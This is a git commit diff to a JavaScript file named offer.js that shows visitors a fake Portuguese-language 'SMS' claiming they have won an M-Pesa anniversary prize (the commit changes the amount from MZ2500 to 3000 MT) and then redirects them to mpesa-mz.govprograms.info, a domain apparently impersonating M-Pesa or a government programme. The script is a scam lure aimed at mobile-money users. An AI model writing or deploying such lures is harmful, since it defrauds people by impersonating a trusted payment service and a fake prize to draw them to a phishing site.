dc092ca7906ae1f77bd8ece6bd18320793f6b9ac
newsrock <newsrock3345@gmail.com>
2025-02-18 02:52:23 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'MZ2500'
-password=prompt('SMS: Parabéns, é elegível para receber o prémio de aniversário MZ2500 Mpesa, Por favor, pressione OK para reclamar o prémio ','MZ2500');
-if (password != 'MZ2500') {
+var password = '3000 MT'
+password=prompt('SMS: Parabéns, é elegível para receber o prémio de aniversário 3000 MT Mpesa, Por favor, pressione OK para reclamar o prémio ','3000 MT');
+if (password != '3000 MT') {
 location.href='https://mpesa-mz.govprograms.info/ofertas';
 }
